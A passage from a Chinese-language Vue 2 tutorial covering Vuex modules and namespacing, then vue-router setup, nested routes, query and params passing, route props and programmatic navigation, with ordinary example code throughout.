        computedB() {
            return 3;
        },
    },
};

export default new Vuex.Store({
    modules: {
        // 模块名 ：模块对象
        aModel: a,
        bModel: b,
    },
});
```

此时，原先组件代码中使用 $store.state 的地方都不能正常显示了，我们可以在组件的 mounted 钩子中输出查看一下当前的 store：

```js
mounted() {
    console.log(this.$store);
},
```

![image-20240502161615511](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405021616878.png)

那么再要访问原先 $store.state.a 的话现在就要这样写：

```js
$store.state.aModel.a
```

原先访问 store 中的 action 的代码却不用改，依旧是这样写：

```js
this.$store.dispatch("doA1");
```

而现在点击 doA1 按钮，去访问 doA1 这个 action 的时候，会想尽一切办法去找 doA1，每一个模块中的 doA1 都会被找出来。假设现在有一个 c 模块，c 里面的 actions 中有一个 doA1 方法，那么点击 doA1 按钮后，会执行两个 doA1 方法，一个是 a 模块中的，一个是 c 模块中的：

![image-20240502162512428](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405021625777.png)

原先访问 getter 和 mutations 的代码都不需要改，只有访问 state 的代码改了。

### 命名空间

而现在有个问题就是，我点击 doA1 按钮后，只想调用 a 模块中的 doA1 方法，而不是访问所有模块中的 doA1。只需要在模块中，开启命名空间：

```js
const a = {
    // 开启命名空间
    namespaced: true,
    actions: {
        doA1() {
            console.log("doA1 action.....");
        },
    },
    mutations: {
        doA2() {
            console.log("doA2 mutation.....");
        },
    },
    state: {
        a: 1,
    },
    getters: {
        computedA() {
            return 1;
        },
    },
};
```

开启了命名空间后，发现现在 getter、mutations 和 actions 都不能正常访问了：

![image-20240502163045547](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405021630950.png)

此时就需要改一下代码，要将模块的名字加上：

```js
doA1() {
    this.$store.dispatch("aModel/doA1");
},
doA2() {
    this.$store.commit("aModel/doA2");
},
```

这样访问 actions 和 mutations 就都没问题了。

还剩一个 getters 无法正常访问，可以这个时候输出 this.$store 看看：

![image-20240502163357681](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405021633061.png)

所以现在要访问 getters 的话要这样访问：

```js
<h3>getters：{{ $store.getters['bModel/computedB'] }}</h3>
```

+ bModel/computedB 这是一个属性名，但是不能通过 `.` 来访问，因为有一个斜杠

### 单文件模块

正常开发中，应该将一个模块写为一个 js 文件来使用。

新建一个 a.js 文件，将 a 模块的代码拷贝进去，同时将 a 模块暴露出来：

```js
export default {
    namespaced: true,
    actions: {
        doA1() {
            console.log("doA1 action.....");
        },
    },
    mutations: {
        doA2() {
            console.log("doA2 mutation.....");
        },
    },
    state: {
        a: 1,
    },
    getters: {
        computedA() {
            return 1;
        },
    },
};
```

b 模块和 c 模块也同样。

然后在 store.js 中要导入这个 a 模块：

```js
import Vue, { computed } from "vue";
import Vuex from "vuex";

Vue.use(Vuex);

import aModel from './a';
import bModel from './b';
import cModel from "./c";

export default new Vuex.Store({
    modules: { aModel, bModel, cModel },
});
```

### map相关

mapState、mapActions、mapGetters、mapMutations。

将 a 组件改成这样，使用这四个 map：

```vue
<template>
    <div>
        <h1>A组件</h1>
        <button @click="doA1">doA1</button>
        <button @click="doA2">doA2</button>
        <h3>state：{{ a }}</h3>
        <h3>getters：{{ computedA }}</h3>
    </div>
</template>

<script>
import { mapState, mapGetters, mapActions, mapMutations } from 'vuex';

export default {
    name: "A",
    computed: {
        ...mapState(['a']),
        ...mapGetters(['computedA']),
    },
    methods: {
        ...mapActions(['doA1']),
        ...mapMutations(['doA2']),
    },
};
</script>
```

这会报错，找不到 a、computedA、doA1、doA2，因为这些东西都被分在了 a 模块，而以上的写法生成的代码是去 store 中寻找，所以需要指定命名空间：

```js
export default {
    name: "A",
    computed: {
        ...mapState('aModel', ['a']),
        ...mapGetters('aModel', ['computedA']),
    },
    methods: {
        ...mapActions('aModel', ['doA1']),
        ...mapMutations('aModel', ['doA2']),
    },
};
```

### 模拟发送ajax请求

B.vue

```vue
<template>
    <div>
        <h1>B组件</h1>
        <button @click="doB1">doB1 BUTTON</button>
        <button @click="doB2">doB2 BUTTON</button>
        <h3>state : {{b}}</h3>
        <h3>getters : {{computedB}}</h3>
        <button @click="displayBugs">显示bug列表信息</button>
        <ul>
            <li v-for="bug in bugList" :key="bug.id">
                {{bug.desc}}
            </li>
        </ul>
    </div>
</template>

<script>
    import {mapState, mapGetters, mapActions, mapMutations} from 'vuex'
    export default {
        name : 'B',
        computed : {
            ...mapState('bModule',['b', 'bugList']),
            ...mapGetters('bModule',['computedB'])
        },
        methods: {
            ...mapActions('bModule',['doB1', 'displayBugs']),
            ...mapMutations('bModule',['doB2'])
        },
    }
</script>
```

b.js

```js
import axios from "axios"

export default {
    namespaced : true,
    actions : {
        doB1(){
            console.log('doB1 action...')
        },
        displayBugs(context){
            axios.get('/api/vue/bugs').then(
                response => {
                    context.commit('DISPLAY_BUGS', response.data)
                },
                error => {
                    console.log('错误信息为：', error.message)
                }
            )
        }
    },
    mutations : {
        doB2(){
            console.log('doB2 mutation...')
        },
        DISPLAY_BUGS(state, value){
            state.bugList = value
        }
    },
    state : {
        b : 3,
        bugList : []
    },
    getters : {
        computedB(){
            return 3
        }
    }
}
```

# 路由route

路由：route

路由器：router

路由器是用来管理和调度路由的。对于一个应用来说，一般路由器只需要一个，但是路由是有多个的。

路由是为单页面应用而生。

## 传统web应用和单页面web应用

传统 web 应用，又叫做多页面 web 应用：核心是一个 web 站点由多个 HTML 页面组成，点击时完成页面的切换，因为是切换到新的 HTML 页面上，所以当前页面会全部刷新。

![image-20240502190721252](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405021907615.png)

 单页面 web 应用（SPA：Single Page web Application），整个网站只有一个 HTM 页面，点击时只是完成当前页面中组件的切换。属于页面局部刷新。

![image-20240502190749401](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405021907728.png)

当点击另一个导航时，路由器检测到地址发生了改变，就会去找新地址对应的组件，渲染出来。那么这个地址可以当成是一个 key，对应的组件就是一个 value，那么地址和组件之间是有一个对应关系的，这个关系就是路由。

说白了就是路由器管理着很多 key : value 对，每一个 key : value 对就是一个路由，key 是路径，value 是组件。

单页应用程序 (SPA) 是加载单个 HTML 页面并在用户与应用程序交互时动态更新该页面的 Web 应用程序。浏览器一开始会加载必需的HTML、CSS 和 JavaScript，所有的操作都在这张页面上完成，都由 JavaScript 来控制。单页面的跳转**仅刷新局部资源**。因此，对单页应用来说**模块化的开发和设计**显得相当重要。

单页面和多页面的对比

![image-20240502191435064](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405021914375.png)

目前较为流行的是单页面应用的开发。如果想使用 Vue 去完成单页面应用的开发，需要借助 Vue 当中的路由机制。

## 路由route和路由器router

每一个路由都由 key 和 value 组成。

+ key：路径
+ value：组件

路由的本质：一个路由表达了一组对应关系。

路由器的本质：管理多组对应 关系。

路由的工作原理：

![image-20240502191727479](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405021917801.png)

## 使用路由

实现一个案例，一个省份列表，点击某个省份，渲染出一个对应的市区列表。

### 准备静态页面

hebei.html

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>河北</title>
    <style>
        .s1 {
            margin-left: 100px;
        }
        .selected {
            background-color: aqua;
        }
    </style>
</head>
<body>
    <div>
        <h1>省份</h1>
        <ul>
            <li><a href="./hebei.html" class="selected">河北省</a></li>
            <li><a href="./henan.html">河南省</a></li>
        </ul>
    </div>
    <div class="s1">
        <h2>市区</h2>
        <ul>
            <li>石家庄</li>
            <li>唐山</li>
            <li>保定</li>
            <li>邯郸</li>
        </ul>
    </div>
</body>
</html>
```

heinan.html

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>河南</title>
    <style>
        .s1 {
            margin-left: 100px;
        }
        .selected {
            background-color: aqua;
        }
    </style>
</head>
<body>
    <div>
        <h1>省份</h1>
        <ul>
            <li><a href="./hebei.html">河北省</a></li>
            <li><a href="./henan.html" class="selected">河南省</a></li>
        </ul>
    </div>
    <div class="s1">
        <h2>市区</h2>
        <ul>
            <li>安阳</li>
            <li>洛阳</li>
            <li>郑州</li>
            <li>开封</li>
        </ul>
    </div>
</body>
</html>
```

现在的效果：

![image-20240502192613459](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405021926810.png)

点击一次超链接，就会刷新一次整个网页

![image-20240502192644133](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405021926473.png)

### 第一个路由程序

将i以上的多页面应用改为一个单页面应用。

先将市区显示的部分拆为一个组件，应该有两个组件，分别显示河南和河北的市区：

HeBei.vue

```vue
<template>
    <div class="s1">
        <h2>市区</h2>
        <ul>
            <li>石家庄</li>
            <li>唐山</li>
            <li>保定</li>
            <li>邯郸</li>
        </ul>
    </div>
</template>

<script>
export default {
    name: 'HeBei'
};
</script>
```

HeNan.vue 和 HeBei.vue 差不多，还有 App.vue：

```vue
<template>
    <div>
        <div>
            <h1>省份</h1>
            <ul>
                <li><a href="./hebei.html">河北省</a></li>
                <li><a href="./henan.html" class="selected">河南省</a></li>
            </ul>
        </div>
        <HeBei></HeBei>
        <HeNan></HeNan>
    </div>
</template>

<script>
import HeBei from "./components/HeBei.vue";
import HeNan from "./components/HeNan.vue";

export default {
    name: "App",
    components: {
        HeBei,
        HeNan,
    },
};
</script>

<style>
.s1 {
    margin-left: 100px;
}
.selected {
    background-color: aqua;
}
</style>
```

此时的页面是：

![image-20240502193751949](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405021937290.png)

显然右下角部分就是需要修改的部分。可以先删除掉 App.vue 中 HeBei 组件和 HeNan 组件的使用。

要使用 vue router，它是一个插件，没有这个插件就无法使用路由器。

需要安装这个插件：

+ vue2 要安装 vue-router3

  ```
  npm i vue-router@3
  ```

+ vu3 要安装 vue-router4

  ```
  npm i vue-router@4
  ```

然后要在 main.js 中导入并使用这个插件：

```js
// 导入
import VueRouter from 'vue-router'
// 使用
Vue.use(VueRouter)
```

使用了插件之后，Vue 实例中就可以多出一个配置项 router，用来接受一个路由器对象，这个路由器对象需要自己新建。

一般会新建一个文件夹 router，在该文件夹下新建一个文件 index.js，在这个 index.js 中创建路由器对象，配置路由信息，最后导出路由器对象。

然后要在 main.js 中导入这个路由器对象，并且传给 Vue 实例的 router 配置项：

```js
import VueRouter from 'vue-router'
// 如果一个文件是index.js，那么可以不写index.js
// import router from './router/index.js'
import router from "./router";

Vue.use(VueRouter)

new Vue({
   el: '#app',
   router: router,
   render: h => h(App),
})
```

那么接下来就是创建路由器对象，在 router/index.js 中：

```js
// 导入VueRouter插件
import VueRouter from "vue-router";
// 导入组件
// @表示指向的是 src 目录，表示路径从src下开始
import HeBei from "@/components/HeBei.vue";
import HeNan from "@/components/HeNan.vue";

// 创建路由器对象，在路由器对象中配置路由
const router = new VueRouter({
    // 在这里配置路由信息
    routes: [
        {
            // 如果路径是 /hebei，就会切换到HeBei组件
            path: '/hebei',
            component: HeBei
        },
        {
            path: '/henan',
            component: HeNan
        }
    ]
});

// 导出路由器对象
export default router;
```

+ routes 是一个数组，数组中的每一个对象就是一个路由
+ 每一个路由现在只有两个属性
  + path：表示路径，必须以 `/` 开始，可以看成路由的 key
  + component：表示组件，可以看成路由的 value
+ 只要路径检测到的是以某个路由的 path ，就会切换到对应的路由。

路由配置好了后，下一个需要改的地方就是 App 组件中，怎么根据路径显示 HeBei 或 HeNan 两个组件。

首先是原先的两个超链接：

```html
<ul>
    <li><a href="./hebei.html">河北省</a></li>
    <li><a href="./henan.html" class="selected">河南省</a></li>
</ul>
```

如果是使用路由的方式，就不能使用 a 超链接了，需要使用 vue-router 插件提供的标签 router-link：

```html
<ul>
    <li><router-link to="/hebei">河北省</router-link></li>
    <li><router-link to="/henan" class="selected">河南省</router-link></li>
</ul>
```

+ router-link 标签会自动被编译为 a 标签

然后点击链接后，要将对应的组件展示出来，需要告诉路由器将组件展示在哪，需要用到一个标签 router-view ，翻译为路由视图，其实就是一个占位符的作用：

```html
<div>
    <div>
        <h1>省份</h1>
        <ul>
            <li><router-link to="/hebei">河北省</router-link></li>
            <li><router-link to="/henan" class="selected">河南省</router-link></li>
        </ul>
    </div>
    <router-view></router-view>
</div>
```

此时初始页面是这样：

![image-20240502213134789](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405022131169.png)

路径上多了一个 # ，并且此时并没有展示出市区的信息，这是因为当前的路径并不匹配路由中的任意一个，所以 router-view 不知道要显示哪个组件，所以啥也没有，现在点击一个省份：

![image-20240502213314197](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405022133562.png)

此时路径匹配到路由 /henan，所以会将 HeNan 这个组件渲染到 router-view 这里。

实现被点击的省份背景高亮，使用 active-class 属性：

```html
<li><router-link to="/hebei" active-class="selected">河北省</router-link></li>
<li><router-link to="/henan" active-class="selected">河南省</router-link></li>
```

这个 active-class 属性是 Vue.js框架中，`router-link` 组件使用 `active-class` 属性来定义当路由链接匹配当前路由时应当添加到该链接元素上的 CSS 类。

## 多级路由

多级路由也叫嵌套路由。

在以上的程序基础上，点击省会出现市，再实现点击市后会出现区：

![image-20240502221206562](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405022212963.png)

只准备两个区的组件就好了，新建一个 ShiJiaZhuang 组件和 TangShan 组件：

```vue
<template>
    <div class="s2">
        <h2>区</h2>
        <ul>
            <li>唐山一区</li>
            <li>唐山二区</li>
            <li>唐山三区</li>
        </ul>
    </div>
</template>

<script>
export default {
    name: "TangShan",
};
</script>
```

接下来要配置二级路由，在原来的 /hebei 路由下使用 children 属性：

```js
routes: [
    {
        path: "/hebei",
        component: HeBei,
        children: [
            {
                path: "shijiazhuang",
                component: ShiJiaZhuang,
            },
            {
                path: "tangshan",
                component: TangShan,
            },
        ],
    },
    {
        path: "/henan",
        component: HeNan,
    },
],
```

+ children 是一个数组，表示多个子路由。数组中一个对象就是一个子路由
+ 子路由中的 path 不要以 `/` 开始，系统会自动添加 `/`。
+ 注意要将组件导入进来

路由配置好后，在 HeBei 的组件中，配置 router-link ：

```vue
<div class="s1">
    <h2>市</h2>
    <ul>
        <li><router-link to="/hebei/shijiazhuang" active-class="selected">石家庄</router-link></li>
        <li><router-link to="/hebei/tangshan" active-class="selected">唐山</router-link></li>
        <li>保定</li>
        <li>邯郸</li>
    </ul>
    <router-view></router-view>
</div>
```

+ 这里的 to 路径一定要带上父路径，写全

最后访问的路径是：

![image-20240502222934591](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405022229981.png)

如果路由中二级路径是这样写的话，以 `/` 开头的话：
```js
{
    path: "/shijiazhuang",
    component: ShiJiaZhuang,
},
```

那么访问的时候就不能带父路径：

```vue
<li><router-link to="/shijiazhuang" active-class="selected">石家庄</router-link></li>
```

但是这样的话在地址栏就只会显示 shijiazhuang 这个路径

![image-20240502222647256](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405022226678.png)

所以总结一下多级路由的使用：

+ 定义子路由需要使用 children 属性，children 是一个数组，数组中一个对象是一个子路由
+ 子路由的 path 不要以 `/` 开始
+ 访问子路由的时候要将路径从父路径开始写全

另外，有了路由后，组件可以分为普通组件和路由组件，一般将普通组件放在 components 文件夹下，将路由组件放在 pages 文件夹下，想该程序中的 HeBei、HeNan、ShiJiaZhuang、TangShan 都是路由组件，所以可以新建一个 pages 文件夹，将这四个组件放在 pages 下（不是必须的）。

## query传参

以上程序还有一个可以改进的地方：无论是 ShiJiaZhuang 组件还是 TangShan 组件，他们的样式都是一样的，不一样的只有数据，所以能不能将数据动态，只写一个组件就行了。在点击市的时候，将区的数据动态的传过去。

所以可以将 ShiJiaZhuang 和 TangShan 组件删掉，然后新建一个 City 组件，这个 City 组件的结构是一样的，就是数据动态。

然后在路由器中重新配置二级路由：

```js
routes: [
    {
        path: "/hebei",
        component: HeBei,
        children: [
            {
                path: "city",
                component: City,
            },
        ],
    },
    {
        path: "/henan",
        component: HeNan,
    },
],
```

接着就是在访问这个路径上通过 query 方式传参：

```vue
<li>
    <router-link to="/hebei/city?a1=长安区&a2=裕华区&a3=新华区" active-class="selected">石家庄</router-link>
</li>
<li>
    <router-link to="/hebei/city?a1=邯山区&a2=复兴区&a3=丛台区" active-class="selected">邯郸</router-link>
</li>
```

+ 这种传参方式实际上是将参数传递到了 city 这个路由对象的 query 属性上

接着就要在 City 组件中获取参数。所有的路由组件都有一个属性 $route：这个 \$route 可以取到组件对应的路由对象，可以查看下这个 \$route ：

```js
export default {
    name: "City",
    mounted() {
        console.log(this.$route);
    }
};
```

![image-20240503081508884](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405030815223.png)

所以就可以通过 this.\$route.query.a1 来拿到“长安区”这个值，所以在 City 组件中就可以通过遍历这个 query 的方式来渲染：

```vue
<template>
    <div class="s2">
        <h2>区</h2>
        <ul>
            <li v-for="(a, index) in $route.query" :key="index">
                {{ a }}
            </li>
        </ul>
    </div>
</template>
```

![image-20240503081932379](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405030819710.png)



另外，在实际开发中，以下代码中的数据其实不会写死：

```vue
<li>
    <router-link to="/hebei/city?a1=长安区&a2=裕华区&a3=新华区" active-class="selected">石家庄</router-link>
</li>
<li>
    <router-link to="/hebei/city?a1=邯山区&a2=复兴区&a3=丛台区" active-class="selected">邯郸</router-link>
</li>
```

要将 to 后面的路径中的参数写成变量的模式，那么就要 to 后面的字符串变成一个变量，需要使用 v-bind 指令绑定，然后使用 ES6 模板语法来拼接字符串：

```vue
<li>
    <router-link :to="`/hebei/city?a1=${sjz[0]}&a2=${sjz[1]}&a3=${sjz[2]}`" active-class="selected"
                 >石家庄</router-link
        >
</li>
<li>
    <router-link :to="`/hebei/city?a1=${hd[0]}&a2=${hd[1]}&a3=${hd[2]}`" active-class="selected"
                 >邯郸</router-link
        >
</li>

<script>
export default {
    name: "HeBei",
    data() {
        return {
            sjz: ["长安区3", "裕华区2", "新华区2"],
            hd: ["邯山区3", "复兴区2", "丛台区2"],
        };
    },
};
</script>
```

+ 也可以将整个路径使用计算属性拼出来，然后直接使用计算属性

以上是通过 query 传参，采用的是字符串拼接方式。还有一种使用对象的方式。

这种对象的形式，是 to 后面整体被改造为一个对象，这个对象中还是要能反映出路径和参数：

```vue
<li>
    <router-link
                 active-class="selected"
                 :to="{
                      path: '/hebei/city',
                      query: {
                          a1: sjz[0],
                          a2: sjz[1],
                          a3: sjz[2],
                          },
                      }"
                 >石家庄</router-link
        >
</li>
<li>
    <router-link
                 active-class="selected"
                 :to="{
                      path: '/hebei/city',
                      query: {
                          a1: hd[0],
                          a2: hd[1],
                          a3: hd[2],
                          },
                      }"
                 >邯郸</router-link
        >
</li>
```

常用的是这种对象形式。

## 激活链接的问题

在以上的程序中，功能虽然实现了，但是有一个问题：

![image-20240503083712478](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405030837817.png)

当我点击一个链接的时候，两个链接都会被激活。

这个问题其实跟链接地址有关系。因为代码中的 active-class 是跟路径有关系的，他会把相同的路径全部都激活，所以可以直接将地址改一下就能解决了：

```vue
<li>
    <router-link
                 active-class="selected"
                 :to="{
                      path: '/hebei/sjz',
                      query: {
                          a1: sjz[0],
                          a2: sjz[1],
                          a3: sjz[2],
                          },
                      }"
                 >石家庄</router-link
        >
</li>
<li>
    <router-link
                 active-class="selected"
                 :to="{
                      path: '/hebei/hd',
                          query: {
                          a1: hd[0],
                          a2: hd[1],
                          a3: hd[2],
                          },
                      }"
                 >邯郸</router-link
        >
</li>
```

然后要在路由器中改一下路由：

```json
{
    path: "/hebei",
    component: HeBei,
    children: [
        {
            path: "sjz",
            component: City,
        },
        {
            path: "hd",
            component: City,
        },
    ],
},
```

就解决了：

![image-20240503084232797](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405030842147.png)

## 路由命名

有可能，在子路由下还有子路由，所以路径就很可能写一长串。为了避免这种麻烦，可以给路由起一个名字。

给路由命名：

```json
{
    path: "/hebei",
    component: HeBei,
    children: [
        {
            name: "shi",  // 给路由命名
            path: "sjz",
            component: City,
        },
        {
            name: "han",  // 给路由命名
            path: "hd",
            component: City,
        },
    ],
},
```

使用路由名字：

```vue
<li>
    <router-link
                 active-class="selected"
                 :to="{
                      name: 'shi',
                      //path: '/hebei/sjz',
                      query: {
                          a1: sjz[0],
                          a2: sjz[1],
                          a3: sjz[2],
                          },
                      }"
                 >石家庄</router-link
        >
</li>
<li>
    <router-link
                 active-class="selected"
                 :to="{
                      name: 'han',
                      // path: '/hebei/hd',
                      query: {
                          a1: hd[0],
                          a2: hd[1],
                          a3: hd[2],
                          },
                      }"
                 >邯郸</router-link
        >
</li>
```

这样不管以后路径有多长，就写一个名字就可以了。但是使用 name 的方式只能在 `:to` 的模式下，也就是说 to 后面不能是一个字符串，只能使用对象形式。

## params传参

query 方式传参是在路径后面跟个 ? ，然后是键值对 & 键值对：

```
/hebei/sjz?a1=长安区3&a2=裕华区2&a3=新华区2
```

params 方式参数直接在路径后面跟数据：

```
/hebei/sjz/长安区/裕华区/新华区2
```

params 传参的字符串形式，写死的字符串：

```vue
<li>
    <router-link active-class="selected" to="/hebei/sjz/裕华区/新华区/长安区">石家庄</router-link>
</li>
<li>
    <router-link active-class="selected" to="/hebei/hd/邯山区/复兴区/丛台区">邯郸</router-link>
</li>
```

params 传参的字符串形式，拼接字符串：

```vue
<router-link active-class="selected" :to="`/hebei/sjz/${sjz[0]}/${sjz[1]}/${sjz[2]}`">石家庄</router-link>
```

params方式传参对象形式：

```vue
<li>
    <router-link
                 active-class="selected"
                 :to="{
                      // 强调：如果使用的是params方式传参，这里只能使用name，不能使用path
                      //path : '/hebei/sjz',
                      name: 'shi',
                      params: {
                          a1: sjz[0],
                          a2: sjz[1],
                          a3: sjz[2],
                          },
                      }"
                 >石家庄</router-link
        >
</li>
```

+ 强调：如果使用的是 params 方式传参，这里只能使用 name，不能使用 path

注意，使用 params 方式传参要在路由中配置一下：

```json
{
    path: "/hebei",
    component: HeBei,
    children: [
        {
            name: "shi",
            path: "sjz/:a1/:a2/:a3",
            component: City,
        },
        {
            name: "han",
            path: "hd/:a1/:a2/:a3",
            component: City,
        },
    ],
},
```

+ 使用 `:` 的表示是参数，`:` 后面的是参数的名字

然后要接受数据，可以先查看一下 \$store 里的结构，有个 params 对象：

![image-20240503091449378](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405030914727.png)

所以取得参数值的方法和 query 传参一样的：

```vue
<ul>
    <li v-for="(a, index) in $route.params" :key="index">
        {{ a }}
    </li>
</ul>
```

+ v-for 遍历对象时，属性名是下标，属性值是值。

## 路由的props配置

观察以下代码：

```vue
<li>{{$route.params.a1}}</li>
<li>{{$route.params.a2}}</li>
<li>{{$route.params.a3}}</li>
```

这是最基础的写法，可以使用计算属性优化，但是计算属性依旧要写一大堆：

```json
computed : {
    a1(){
        return this.$route.params.a1
    },
    a2(){
        return this.$route.params.a2
    },
    a3(){
        return this.$route.params.a3
    },
}
```

可以使用 mapState 继续优化计算属性。

### 对象写法

但是路由中有一个属性 props，在路由的配置中使用这个属性，可以简化这一部分。

在子路由 sjz 中配置 props：

```json
{
    name: "shi",
    path: "sjz/:a1/:a2/:a3",
    component: City,
    props: {
        x: "张三",
        y: "李四",
    },
},
```

当访问这个路径的时候，路由器会经过这个路由，可以访问到这个 props 对象，最后跳转到 City 这个组件上，那么在 City 组件中就可以接收这个 props 里面的数据。也是通过 props 来接收：

```vue
<template>
    <div class="s2">
        <h2>区</h2>
        <ul>
            <li v-for="(a, index) in $route.params" :key="index">
                {{ a }}
            </li>
        </ul>
        {{ x }}  // 张三
        {{ y }}  // 李四
    </div>
</template>

<script>
export default {
    name: "City",
    props: ["x", "y"],
};
</script>
```

![image-20240503093409887](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405030934088.png)

当然，现在的路由中的 props 是写死的，如何让他动态的呢？

### 函数写法

props 还有一个函数式写法，将来会自动调用这个对象，并提供一个参数，这个参数是当前路由对象，最终这个 props 还是要返回一个对象：

```json
{
    name: "shi",
    path: "sjz/:a1/:a2/:a3",
    component: City,
    props($route) {  // 这个参数名随意
        return {
            a1: $route.params.a1,
            a2: $route.params.a2,
            a3: $route.params.a3,
        };
    }
},
```

+ 当前是 params 传参方式，所以使用 \$route.params.a1；如果是 query 方式，就用 \$route.query .a1

然后 City 组件接收与展示：

```vue
<template>
    <div class="s2">
        <h2>区</h2>
        <ul>
            <li>{{ a1 }}</li>
            <li>{{ a2 }}</li>
            <li>{{ a3 }}</li>
        </ul>
    </div>
</template>

<script>
export default {
    name: "City",
    props: ["a1", "a2", "a3"],
};
</script>
```

利用这个，也可以直接将整个 params 参数对象传给 City 组件，然后 City 组件自己遍历渲染：

```js
{
    name: "shi",
    path: "sjz/:a1/:a2/:a3",
    component: City,
    props($route) {  // 这个参数名随意
        return {
            params: $route.params,
        };
    }
},
```

```vue
<template>
    <div class="s2">
        <h2>区</h2>
        <ul>
            <li v-for="val,name in params" :key="name">
                {{ val }}
            </li>
        </ul>
    </div>
</template>

<script>
export default {
    name: "City",
    props: ["params"],
};
</script>
```

### 极简写法

这种写法只支持 params 传参，不支持 query 传参。

写法：

```json
{
    name: "shi",
    path: "sjz/:a1/:a2/:a3",
    component: City,
    props: true,
},
```

这会将 parmas 对象直接转换成 props 对象，内部直接转换，不需要我们负责。

然后 City 组件接收与使用：

```vue
<template>
    <div class="s2">
        <h2>区</h2>
        <ul>
            <li>{{ a1 }}</li>
            <li>{{ a2 }}</li>
            <li>{{ a3 }}</li>
        </ul>
    </div>
</template>

<script>
export default {
    name: "City",
    props: ["a1", "a2", "a3"],
};
</script>
```

## 浏览器的前进和后退

需要知道一种数据结构：栈。

浏览器的历史记录是存放在栈这种数据结构里面的。历史记录在存放到栈中的时候有两种不同的模式：push 和 replace。

+ push：以追加的方式入栈
+ replace：以替换栈顶元素的方式入栈

浏览器默认的模式是 push 模式。在浏览器上前进和后退是不会删除栈内的数据的，只是会将栈顶指针向上或向下移动。

![image-20240503100839258](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031008648.png)

就以上面的程序为例：

![image-20240503100524150](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031005561.png)

如何开启 replace 模式呢？在代码中，在 router-link 中加一个属性：

```vue
<router-link :replace="true" active-class="selected" to="/hebei/hd/邯山区/复兴区/丛台区">邯郸</router-link>
```

+ 也可以直接写一个 replace

这样的话，当访问这个链接的时候，他就会替换栈顶元素。

## 编程式路由导航

之前，在进行路由组件切换的时候，使用的是 router-link，router-link 最后会被编译为 a 超链接，所以目前本质上是通过超链接来完成路由组件的切换。这个叫声明式的路由导航。

如果现在有一个按钮，点击按钮后执行一段代码，来完成路由组件的切换，这种通过编程的方式完成路由组件的切换叫做编程式路由导航。（其实就是调用现有的 API 来切换路由组件）

比如，在 HeBei 组件中加一个按钮，点击按钮后切换到 ShiJiaZhuang 组件：

```vue
 <button @click="showSJZ">显示石家庄的区</button>
```

然后在 showSJZ 方法中，要获取到路由器对象 this.\$router，这个对象中有两个方法 push 和 replace，因为这里会切换路由，切换路由就会有两种方式将路由放入浏览器的栈中，这里的两种方法就是对应着两种方式。

比如以 push 模式切换路由：

```vue
<script>
export default {
    name: "HeBei",
    data() {
        return {
            sjz: ["长安区3", "裕华区2", "新华区2"],
            hd: ["邯山区3", "复兴区2", "丛台区2"],
        };
    },
    methods: {
        showSJZ() {
            // 获取路由器对象
            this.$router.push({
                name: "shi",
                params: {
                    a1: this.sjz[0],
                    a2: this.sjz[1],
                    a3: this.sjz[2],
                },
            });
        },
    },
};
</script>
```

+ 路由器对象是 this.\$router，路由对象是 this.\$route，

+ this.\$router 对象是整个项目的路由器对象，路由器对象一般一个项目只需要一个。

+ push 方法里面写的参数就是 rouer-link 上 `:to` 后的对象。或者写字符串链接也可以：

  ```js
  this.$router.push("/hebei/hd/邯山区/复兴区/丛台区");
  ```

this.\$router 中不止有 push 和 replace 两种 API，还有前进、后退、前进几步、后退几步的 API。

在 App.vue 中添加四个按钮：

```vue
<button @click="forward">前进</button>
<button @click="back">后退</button>
<button @click="forwardTwo">前进2步</button>
<button @click="backTwo">后退2步</button>
```

然后实现这四个方法，调用 API：

```js
export default {
    name: "App",
    components: {
        HeBei,
        HeNan,
    },
    methods: {
        forward() {
            this.$router.forward();
        },
        back() {
            this.$router.back();
        },
        forwardTwo() {
            this.$router.go(2);
        },
        backTwo() {
            this.$router.go(-2);
        },
    },
};
```

![image-20240503103800443](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031038841.png)

但此时有个问题，点击一次石家庄按钮，会正常显示页面，但是再点一次这个按钮就会报错：

![image-20240503104040544](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405031040972.png)

这是因为，在使用编程式路由导航时，push 或 replace 方法会返回一个 Promise 对象，Promise 对象期望你能通过参数的方式给它两个回调函数，一个是成功的回调，一个是失败的回调。如果你没有给这两个回调函数，则会出现错误。

怎么解决：在 push 或 replace 方法的参数位置上给两个回调函数：

```js
export default {
    name: "HeBei",
    data() {
        return {
            sjz: ["长安区3", "裕华区2", "新华区2"],
            hd: ["邯山区3", "复兴区2", "丛台区2"],
        };
    },
    methods: {
        showSJZ() {
            this.$router.push(
                {
                    name: "shi",
                    params: {
                        a1: this.sjz[0],
                        a2: this.sjz[1],
                        a3: this.sjz[2],
                    },
                },
                () => { },
                () => { }
            );
        },
    },
};
```

两个函数里面啥也不给，当发生错误的时候就不会执行任何事。可以在这两个函数中输出一下：

```js
this.$router.push(
    {
        name: "shi",
        params: {
            a1: this.sjz[0],
            a2: this.sjz[1],
